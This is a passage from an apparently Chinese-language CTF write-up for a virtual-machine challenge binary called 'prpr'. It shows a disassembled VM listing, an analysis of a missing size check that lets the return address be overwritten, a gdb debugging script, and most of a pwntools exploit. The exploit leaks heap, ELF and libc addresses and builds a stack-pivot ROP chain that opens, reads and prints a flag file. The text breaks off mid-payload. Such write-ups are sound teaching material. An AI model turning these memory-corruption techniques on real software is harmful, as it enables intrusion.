class="hljs-attribute">195</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">196</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">197</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">198</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">199</span>     push                <span class="hljs-number">4</span><br><span class="hljs-attribute">200</span>     mul                 <span class="hljs-number">0</span><br><span class="hljs-attribute">201</span>     write_mem           <span class="hljs-number">0</span><br><span class="hljs-attribute">202</span>     push_reg            <span class="hljs-number">1</span><br><span class="hljs-attribute">203</span>     mem_or              <span class="hljs-number">0</span><br><span class="hljs-attribute">204</span>     push_reg            <span class="hljs-number">2</span><br><span class="hljs-attribute">205</span>     push                <span class="hljs-number">4</span><br><span class="hljs-attribute">206</span>     mul                 <span class="hljs-number">0</span><br><span class="hljs-attribute">207</span>     read_mem            <span class="hljs-number">0</span><br><span class="hljs-attribute">208</span>     ret                 <span class="hljs-number">0</span><br><br><span class="hljs-attribute">6</span>:<br><span class="hljs-attribute">209</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">210</span>     pop_reg             <span class="hljs-number">3</span><br><span class="hljs-attribute">211</span>     push input_int()    <span class="hljs-number">0</span><br><span class="hljs-attribute">212</span>     pop_reg             <span class="hljs-number">4</span><br><span class="hljs-attribute">213</span>     push                <span class="hljs-number">63</span><br><span class="hljs-attribute">214</span>     push_reg            <span class="hljs-number">4</span><br><span class="hljs-attribute">215</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">216</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">217</span>     push_reg            <span class="hljs-number">4</span><br><span class="hljs-attribute">218</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">219</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">220</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">221</span>     push                <span class="hljs-number">0</span><br><span class="hljs-attribute">222</span>     pop_reg             <span class="hljs-number">5</span><br><span class="hljs-attribute">223</span>     push_reg            <span class="hljs-number">4</span><br><span class="hljs-attribute">224</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">225</span>     greater             <span class="hljs-number">0</span><br><span class="hljs-attribute">226</span>     jnz                 <span class="hljs-number">245</span><br><span class="hljs-attribute">227</span>     call                <span class="hljs-number">60</span><br><span class="hljs-attribute">228</span>     push_reg            <span class="hljs-number">3</span><br><span class="hljs-attribute">229</span>     or                  <span class="hljs-number">0</span><br><span class="hljs-attribute">230</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">231</span>     mem[pop()] = pop()  <span class="hljs-number">0</span><br><span class="hljs-attribute">232</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">233</span>     push mem[pop()]     <span class="hljs-number">0</span><br><span class="hljs-attribute">234</span>     push                <span class="hljs-number">255</span><br><span class="hljs-attribute">235</span>     eq                  <span class="hljs-number">0</span><br><span class="hljs-attribute">236</span>     jnz                 <span class="hljs-number">0</span><br><span class="hljs-attribute">237</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">238</span>     push mem[pop()]     <span class="hljs-number">0</span><br><span class="hljs-attribute">239</span>     print pop()         <span class="hljs-number">0</span><br><span class="hljs-attribute">240</span>     push_reg            <span class="hljs-number">5</span><br><span class="hljs-attribute">241</span>     push                <span class="hljs-number">1</span><br><span class="hljs-attribute">242</span>     add                 <span class="hljs-number">0</span><br><span class="hljs-attribute">243</span>     pop_reg             <span class="hljs-number">5</span><br><span class="hljs-attribute">244</span>     jmp                 <span class="hljs-number">223</span><br><span class="hljs-attribute">245</span>     ret                 <span class="hljs-number">0</span><br><span class="hljs-attribute">246</span>     Exit                <span class="hljs-number">0</span><br><span class="hljs-attribute">247</span>     Exit                <span class="hljs-number">0</span><br><span class="hljs-attribute">248</span>     Exit                <span class="hljs-number">0</span><br><span class="hljs-attribute">249</span>     Exit                <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这个虚拟机含有6个功能，_start接收一个int的输入，然后跳到对应的功能中去<br>功能1接收一个0到255的数，表示为key，再接收一个0到63的size<br>然后读取指定size的数据至mem中，然后用key和每个mem中的byte进行and运算，最后打印输出<br>功能1会对写入mem的数据进行and运算，然后打印的也是and后的结果</p><p>功能2接收一个数，表示为key，再接收一个0到63的size<br>然后依次读取一个int，写入mem中，最后将mem中的数据and后打印输出<br>功能2不会影响写入mem的数据，只会对打印and后的数据</p><p>功能3,5与1相同，不过分别进行的是xor与or运算<br>功能4,6与2相同，不过分别进行的是xor与or运算，并且会影响写入mem的数据</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞点存在于mem_and、mem_or、mem_xor三个函数中<br>这三个函数在进行运算时，不会检测size，仅仅检测目标地址是否为’\0’<br>因此就有可能覆盖到mem中的返回地址</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们采用功能6进行mem的填充,将所有mem填充为-1，从而能够利用漏洞覆盖掉返回地址<br>然后采用功能3进行mem的布置与ret地址的覆盖，在mem布置虚拟机指令</p><p>我们将返回地址修改为50，以调用<code>call 60</code>这条指令<br>因为返回时mem_pointer会减一，需要调用call来使mem_pointer加一<br>同时此时的reg5为64，可以直接在ret地址上写数据，从而达到任意地址ret，我们将pc转移到我们的可控区即mem中</p><p>同时因为一次可控的大小有限，所有需要分多次写入虚拟机指令<br>第一阶段先泄露地址，然后读入第二阶段指令并跳转过去执行<br>第二阶段泄露地址的同时布置ROP链，然后读入第三阶段的指令并跳转过去执行<br>第三阶段泄露栈地址，同时覆盖vm_run的返回地址为<code>pop rsp;ret</code>,从而将栈迁移到第二阶段布置的ROP链上，然后使vm_run函数返回</p><p>由于第一、第二、第三阶段共用一个mem<br>需要保证第二阶段读入的指令不会覆盖掉第一阶段的的jmp指令，第三阶段读入的指令不会覆盖掉第二阶段的的jmp指令</p><p>一条虚拟机指令需要占用12字节的空间，一个mem的大小为256字节<br>并且经过计算发现使用的mem前需要有8个字节的填充，所以实际可用248字节<br>所以每个阶段最多可用20条指令，并且为了不覆盖前一阶段的jmp，每个阶段需要少用一条<br>也就是说第一次可用20条，第二次可用19条，第三次可用18条</p><p>写了一个gdb脚本，方便调试虚拟机指令，基本上只需要按c就可以运行一条虚拟机指令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#set context-output /dev/pts/3</span><br><span class="hljs-built_in">set</span> context-output /dev/null<br><br>b *<span class="hljs-variable">$rebase</span>(0x201E)<br><span class="hljs-comment">#b *$rebase(0x2073)</span><br><span class="hljs-comment">#b *$rebase(0x2524)</span><br><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$prc</span>=<span class="hljs-variable">$rebase</span>(0x6020)<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$stack_pointer</span>=<span class="hljs-variable">$rebase</span>(0x601C)<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$mem_pointer</span>=<span class="hljs-variable">$rebase</span>(0x6018)<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$vm_info</span>=*(int ***)<span class="hljs-variable">$rebase</span>(0x6028)<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$regs</span>=*(<span class="hljs-variable">$vm_info</span>+2)<br><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r0</span>=<span class="hljs-variable">$regs</span> <br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r1</span>=<span class="hljs-variable">$regs</span>+1<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r2</span>=<span class="hljs-variable">$regs</span>+2<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r3</span>=<span class="hljs-variable">$regs</span>+3<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r4</span>=<span class="hljs-variable">$regs</span>+4<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r5</span>=<span class="hljs-variable">$regs</span>+5<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$r6</span>=<span class="hljs-variable">$regs</span>+6<br><br><span class="hljs-built_in">set</span> <span class="hljs-variable">$stack</span>=(int *)<span class="hljs-variable">$vm_info</span>+8 <br><span class="hljs-built_in">set</span> <span class="hljs-variable">$mem0</span>=(int *)<span class="hljs-variable">$vm_info</span>+8+1000<br><span class="hljs-built_in">set</span> <span class="hljs-variable">$mem1</span>=(int *)<span class="hljs-variable">$vm_info</span>+8+1000+65<br><br>display *<span class="hljs-variable">$prc</span><br>display *<span class="hljs-variable">$stack_pointer</span><br>display *<span class="hljs-variable">$mem_pointer</span><br>display <span class="hljs-variable">$vm_info</span><br>display <span class="hljs-variable">$stack</span>[*<span class="hljs-variable">$stack_pointer</span>-1]<br>display <span class="hljs-variable">$stack</span>[*<span class="hljs-variable">$stack_pointer</span>]<br>display <span class="hljs-variable">$mem0</span><br>display <span class="hljs-variable">$mem1</span><br>display *<span class="hljs-variable">$r0</span><br>display *<span class="hljs-variable">$r1</span><br>display *<span class="hljs-variable">$r2</span><br>display *<span class="hljs-variable">$r3</span><br>display *<span class="hljs-variable">$r4</span><br>display *<span class="hljs-variable">$r5</span><br>display *<span class="hljs-variable">$r6</span><br><br>display *((char *)<span class="hljs-variable">$rsi</span>+<span class="hljs-number">1</span>)<br>display *((char *)<span class="hljs-variable">$rsi</span>+<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;./prpr&quot;</span>)<br><br>program = ELF(<span class="hljs-string">&quot;./prpr&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_content</span>(<span class="hljs-params">xor_key,size,content</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(xor_key).encode())<br>    p.sendline(<span class="hljs-string">b&#x27;%d&#x27;</span> % (size / <span class="hljs-number">4</span>))<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">or_content_seq</span>(<span class="hljs-params">or_key,size,data</span>):<br>    p.sendline(<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(or_key).encode())<br>    p.sendline(<span class="hljs-string">b&#x27;%d&#x27;</span> % (size // <span class="hljs-number">4</span>))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size//<span class="hljs-number">4</span>+<span class="hljs-number">1</span>):<br>        p.sendline(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:<br>        x = x + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%U&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push_r</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%k&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop_r</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%Y&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(idx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push mem[pop()]</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%#V&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>():<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mem[pop()] = pop()</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%#X&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_sp</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%y&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">input_sp</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%a&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:<br>        x = x + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%N&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_mem</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%c&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_mem</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%b&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">call</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:<br>        x = x + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%g&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">retn</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;%n&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">0</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;[___]&#x27;</span>)<br><br><span class="hljs-comment"># stage 1</span><br><span class="hljs-comment"># padding</span><br>code = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span><br><br><span class="hljs-comment"># set mem_idx = 0</span><br>code += call(-<span class="hljs-number">0x65c4</span>//<span class="hljs-number">12</span>+<span class="hljs-number">1</span>) <span class="hljs-comment"># mem_idx++</span><br>code += jmp(-<span class="hljs-number">0x65c4</span>//<span class="hljs-number">12</span>+<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># leak code heap addr</span><br>code += push(-<span class="hljs-number">0x10c4</span>//<span class="hljs-number">4</span>) + load()<br>code += print_sp()<br>code += push(-<span class="hljs-number">0x10c4</span>//<span class="hljs-number">4</span>+<span class="hljs-number">1</span>) + load()<br>code += print_sp()<br><br><span class="hljs-comment"># leak elf_base</span><br>code += push(-<span class="hljs-number">0x19D4</span>//<span class="hljs-number">4</span>) + load()<br>code += print_sp()<br>code += push(-<span class="hljs-number">0x19D4</span>//<span class="hljs-number">4</span>+<span class="hljs-number">1</span>) + load()<br>code += print_sp()<br><br><span class="hljs-comment"># leak free_got address</span><br>code += input_sp()<br>code += load()<br>code += print_sp()<br><br><span class="hljs-comment">#read stage2 code into mem[0] and exec</span><br>code += push(<span class="hljs-number">0xec</span>) + write_mem()<br>code += jmp(-<span class="hljs-number">0x65c4</span>//<span class="hljs-number">12</span>+<span class="hljs-number">3</span>)<br><br>code = code.ljust(<span class="hljs-number">0xfc</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> code:<br>   payload += p8(x ^ <span class="hljs-number">0x68</span>)<br><br>or_content_seq(<span class="hljs-number">0xfe</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>xor_content(<span class="hljs-number">0x68</span>,<span class="hljs-number">0xfc</span>,payload)<br><br>p.sendline(<span class="hljs-built_in">str</span>(-<span class="hljs-number">0x65c4</span>//<span class="hljs-number">12</span>).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaa%g\n&#x27;</span>)<br><br>heap_addr = (<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>) | ((<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>) &lt;&lt; <span class="hljs-number">32</span>)<br>elf_base = ((<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>) | ((<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>) &lt;&lt; <span class="hljs-number">32</span>)) - <span class="hljs-number">0x2750</span><br><br>free_got_addr = elf_base + program.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>memory_base = heap_addr - <span class="hljs-number">0x65CC</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_addr=&#x27;</span>,<span class="hljs-built_in">hex</span>(heap_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;memory_base=&#x27;</span>,<span class="hljs-built_in">hex</span>(memory_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;elf_base=&#x27;</span>,<span class="hljs-built_in">hex</span>(elf_base))<br><br>p.sendline(<span class="hljs-built_in">str</span>((free_got_addr - memory_base)//<span class="hljs-number">4</span>).encode())<br>free_addr_low = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;free_addr_low=&#x27;</span>,<span class="hljs-built_in">hex</span>(free_addr_low))<br><br><span class="hljs-comment"># stage 2</span><br>code = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span><br>code += push(<span class="hljs-number">0xfc</span>) + write_mem()<br>code += retn()<br><br><span class="hljs-comment"># stage2 start</span><br>code += input_sp()<br>code += load()<br>code += print_sp()<br>code += call(-<span class="hljs-number">0x65c4</span>//<span class="hljs-number">12</span>) <span class="hljs-comment">#read rop into mem[1]</span><br><br>code += input_sp()<br>code += push(-<span class="hljs-number">0x10b4</span>//<span class="hljs-number">4</span>) + save()<br>code += input_sp()<br>code += push(-<span class="hljs-number">0x10b4</span>//<span class="hljs-number">4</span>+<span class="hljs-number">1</span>) + save()<br>code += push_r(<span class="hljs-number">0</span>) <span class="hljs-comment">#leak stack_addr</span><br>code += print_sp()<br><br><span class="hljs-comment"># read stage3 code into mem[0] and exec</span><br>code += push(<span class="hljs-number">0xd4</span>) + write_mem()<br>code += jmp(-<span class="hljs-number">0x65c4</span>//<span class="hljs-number">12</span>)<br><br>code = code.ljust(<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendline(code)<br><br>sleep(<span class="hljs-number">1</span>)<br>p.sendline(<span class="hljs-built_in">str</span>((free_got_addr - memory_base)//<span class="hljs-number">4</span>+<span class="hljs-number">1</span>))<br>free_addr = free_addr_low | ((<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop = <span class="hljs-literal">True</span>)) &amp; <span class="hljs-number">0xffffffff</span>) &lt;&lt; <span class="hljs-number">32</span>)<br>libc_base = free_addr - libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>gets_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>environ_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;environ&#x27;</span>]<br><br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall;ret&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)))<br>pop_rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span><br>pop_rsp = libc_base + <span class="hljs-number">0x0000000000035732</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>pop_rdx_rbx = libc_base + <span class="hljs-number">0x00000000000904a9</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;free_addr=&#x27;</span>,<span class="hljs-built_in">hex</span>(free_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base=&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment">#rop</span><br>rop_addr = heap_addr - <span class="hljs-number">0x64c8</span><br>flag_addr = rop_addr + <span class="hljs-number">23</span> * <span class="hljs-number">8</span><br><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">100</span>)*<span class="hljs-number">2</span> + p64(read_addr)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx_rbx) + p64(<span class="hljs-number">100</span>)*<span class="hljs-number">2</span> + p64(write_addr)<br>payload += <span 